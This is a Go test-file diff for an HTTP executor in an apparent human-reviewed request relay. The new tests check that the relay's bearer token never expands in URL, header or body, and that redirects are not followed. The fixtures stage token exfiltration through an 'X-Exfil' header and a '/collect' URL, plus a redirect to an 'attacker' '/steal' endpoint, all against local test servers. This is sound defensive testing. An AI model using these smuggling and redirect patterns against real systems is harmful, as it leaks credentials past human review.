@@ -325,7 +325,6 @@ func TestExecuteHTTPDeleteMethod(t *testing.T) {
 
 func TestExecuteHTTP3xxExitCode(t *testing.T) {
 	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		// http.Client follows redirects by default, so return a non-redirect 3xx
 		w.WriteHeader(304)
 	}))
 	defer ts.Close()
@@ -514,6 +513,173 @@ func TestExecuteHTTPErrorScrubsCredentials(t *testing.T) {
 	// The unexpanded placeholder should be there instead
 	if !strings.Contains(result.Stderr, "${TEST_SECRET_KEY}") {
 		t.Fatalf("expected unexpanded placeholder in error, got: %s", result.Stderr)
+	}
+}
+
+// Finding #25a: ${MHR_AUTH_TOKEN} must never expand. The store keeps the
+// unexpanded string for review, so a request naming the relay's own bearer
+// secret looks harmless to the human and would otherwise ship the real token.
+func TestExecuteHTTPAuthTokenNeverExpanded(t *testing.T) {
+	t.Setenv("MHR_AUTH_TOKEN", "relay-bearer-supersecret")
+
+	var receivedURL, receivedHeader, receivedBody string
+	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		receivedURL = r.URL.String()
+		receivedHeader = r.Header.Get("X-Exfil")
+		buf := make([]byte, 4096)
+		n, _ := r.Body.Read(buf)
+		receivedBody = string(buf[:n])
+		w.WriteHeader(200)
+	}))
+	defer ts.Close()
+
+	e := newTestExecutor()
+	req := &store.Request{
+		Type:       "http",
+		HTTPMethod: "POST",
+		HTTPURL:    ts.URL + "/collect?t=${MHR_AUTH_TOKEN}",
+		HTTPHeaders: map[string]string{
+			"X-Exfil": "Bearer ${MHR_AUTH_TOKEN}",
+		},
+		HTTPBody: `{"token":"${MHR_AUTH_TOKEN}"}`,
+	}
+
+	result := e.ExecuteHTTP(req)
+
+	if result.ExitCode != 0 {
+		t.Fatalf("expected exit code 0, got %d (stderr: %s)", result.ExitCode, result.Stderr)
+	}
+	for _, tc := range []struct{ name, got string }{
+		{"url", receivedURL},
+		{"header", receivedHeader},
+		{"body", receivedBody},
+	} {
+		if strings.Contains(tc.got, "relay-bearer-supersecret") {
+			t.Fatalf("relay auth token leaked via %s: %s", tc.name, tc.got)
+		}
+		if !strings.Contains(tc.got, "MHR_AUTH_TOKEN") {
+			t.Fatalf("expected literal placeholder preserved in %s, got: %s", tc.name, tc.got)
+		}
+	}
+	if receivedHeader != "Bearer ${MHR_AUTH_TOKEN}" {
+		t.Fatalf("expected header placeholder left literal, got: %q", receivedHeader)
+	}
+	if !strings.Contains(receivedBody, "${MHR_AUTH_TOKEN}") {
+		t.Fatalf("expected body placeholder left literal, got: %q", receivedBody)
+	}
+}
+
+// The denylist is narrow on purpose: other env-var secrets must still expand,
+// which is the feature's intended use.
+func TestExecuteHTTPNonProtectedVarsStillExpand(t *testing.T) {
+	t.Setenv("MHR_AUTH_TOKEN", "relay-bearer-supersecret")
+	t.Setenv("TRELLO_TOKEN", "trello-tok-789")
+	t.Setenv("MHR_DATA_DIR", "/opt/human-relay/data")
+
+	var receivedURL string
+	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		receivedURL = r.URL.String()
+		w.WriteHeader(200)
+	}))
+	defer ts.Close()
+
+	e := newTestExecutor()
+	req := &store.Request{
+		Type:       "http",
+		HTTPMethod: "GET",
+		HTTPURL:    ts.URL + "/1/cards?token=${TRELLO_TOKEN}&dir=${MHR_DATA_DIR}",
+	}
+
+	result := e.ExecuteHTTP(req)
+
+	if result.ExitCode != 0 {
+		t.Fatalf("expected exit code 0, got %d (stderr: %s)", result.ExitCode, result.Stderr)
+	}
+	if !strings.Contains(receivedURL, "trello-tok-789") {
+		t.Fatalf("non-protected secret should still expand, got: %s", receivedURL)
+	}
+	if !strings.Contains(receivedURL, "%2Fopt%2Fhuman-relay%2Fdata") && !strings.Contains(receivedURL, "/opt/human-relay/data") {
+		t.Fatalf("non-secret MHR_ config var should still expand, got: %s", receivedURL)
+	}
+}
+
+// Finding #25b: a redirect must not be followed. Go's default policy only
+// strips Authorization/Cookie/WWW-Authenticate cross-host; any other custom
+// header (holding an expanded secret) would ride along to the 3xx target.
+func TestExecuteHTTPRedirectNotFollowed(t *testing.T) {
+	t.Setenv("TEST_VAULTED_KEY", "vaulted-key-abc")
+
+	var attackerHits int
+	var attackerSawHeader string
+	attacker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		attackerHits++
+		attackerSawHeader = r.Header.Get("X-Api-Key")
+		w.WriteHeader(200)
+		fmt.Fprint(w, "attacker got it")
+	}))
+	defer attacker.Close()
+
+	benign := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		http.Redirect(w, r, attacker.URL+"/steal", http.StatusFound)
+	}))
+	defer benign.Close()
+
+	e := newTestExecutor()
+	req := &store.Request{
+		Type:       "http",
+		HTTPMethod: "GET",
+		HTTPURL:    benign.URL + "/looks-fine",
+		HTTPHeaders: map[string]string{
+			"X-Api-Key": "${TEST_VAULTED_KEY}",
+		},
+	}
+
+	result := e.ExecuteHTTP(req)
+
+	if attackerHits != 0 {
+		t.Fatalf("redirect target was contacted %d time(s); it must never be reached", attackerHits)
+	}
+	if attackerSawHeader != "" {
+		t.Fatalf("custom header forwarded to redirect target: %q", attackerSawHeader)
+	}
+	if result.StatusCode != http.StatusFound {
+		t.Fatalf("expected the 302 itself to be returned, got status %d", result.StatusCode)
+	}
+	if result.ExitCode != 1 {
+		t.Fatalf("expected exit code 1 for a 302, got %d", result.ExitCode)
+	}
+	if loc := result.RespHeaders["Location"]; loc != attacker.URL+"/steal" {
+		t.Fatalf("expected Location header surfaced for inspection, got: %q", loc)
+	}
+}
+
+// Same-host redirects are not followed either — the reviewer approved one URL.
+func TestExecuteHTTPSameHostRedirectNotFollowed(t *testing.T) {
+	var secondHits int
+	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		if r.URL.Path == "/second" {
+			secondHits++
+			w.WriteHeader(200)
+			return
+		}
+		http.Redirect(w, r, "/second", http.StatusMovedPermanently)
+	}))
+	defer ts.Close()
+
+	e := newTestExecutor()
+	req := &store.Request{
+		Type:       "http",
+		HTTPMethod: "GET",
+		HTTPURL:    ts.URL + "/first",
+	}
+
+	result := e.ExecuteHTTP(req)
+
+	if secondHits != 0 {
+		t.Fatalf("redirect was followed: /second hit %d time(s)", secondHits)
+	}
+	if result.StatusCode != http.StatusMovedPermanently {
+		t.Fatalf("expected 301 returned, got %d", result.StatusCode)
 	}
 }
 
